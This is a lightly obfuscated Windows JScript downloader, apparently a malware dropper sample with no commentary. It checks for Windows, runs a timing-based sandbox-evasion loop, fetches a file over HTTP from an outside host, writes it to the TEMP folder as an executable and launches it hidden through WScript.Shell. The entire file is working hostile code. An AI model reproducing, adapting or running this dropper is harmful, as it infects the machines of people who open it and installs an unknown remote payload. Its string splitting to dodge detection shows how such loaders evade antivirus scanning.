var M = false;
var b = "CreateObject";
var B = function f() {return WScript[b]("WScript.Shell");}(), S = 11;
var f0 = "MSXML2.XMLHTTP";
var i = 2123213;
var E = 0;
function d(Cg){B["Run"](Cg, E, E);};
function vW(){return "" + f0;};
function tW(I, Sm){E = E * 1; return I - Sm;};
function z(){return b;};
/*@cc_on
  @if (@_win32 || @_win64)
    M = true;
  @end
@*/
if (M)
{
var A = "";
function X(){return 22;};
var RS = 0; var O = 0;
function uy()
{
var vi = new this["Date"]();
var Il = vi["getUTCMilliseconds"]();
WScript["Sleep"](X());
var vi = new this["Date"]();
var g = vi["getUTCMilliseconds"]();
WScript["Sleep"](X());
var vi = new this["Date"]();
var F = vi["getUTCMilliseconds"]();
var RS = "pP";
RS = tW(g, Il);
var O = "sW";
O = tW(F, g);
A = "open";
return tW(RS, O);
}
var fi = false;
var Rn = false;
for (var v = E; v < X() * 1; v++){if (uy() != E){
fi = true; 
O = "31" + 11 * RS + O; 
Rn = true; 
break;
}}
function y() {return ((fi == true) && (fi == Rn)) ? 1 : E;};
if (fi && y() && Rn){
function Iq() {return B["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "dBMceEbETP.exe";};
 m = vW();
 Wi = WScript[b](m);
 var L = 1;
 while (L){
try {
Wi[A]("GET", "http://blog.saletron.net/li9soz", false);
Wi["send"]();
te = "Sleep";
for (;;){WScript[te](X() * 11); if (Wi["readystate"] >= 2 * 2) break;};
L = E;
} catch(dN){};
}
function h(l) {var SI = (1, 2, 3, 4, 5, l); return SI;};
An = WScript[z()]("ADODB.Stream");
m = An;
m[A]();
m["type"] = h(1);
m["write"](Wi["ResponseBody"]);
An["position"] = h(E);
m["Save" + "ToFile"](Iq(), 2);
An["c"+"lose"]();
Nr = Iq();
d(Nr);
}
}

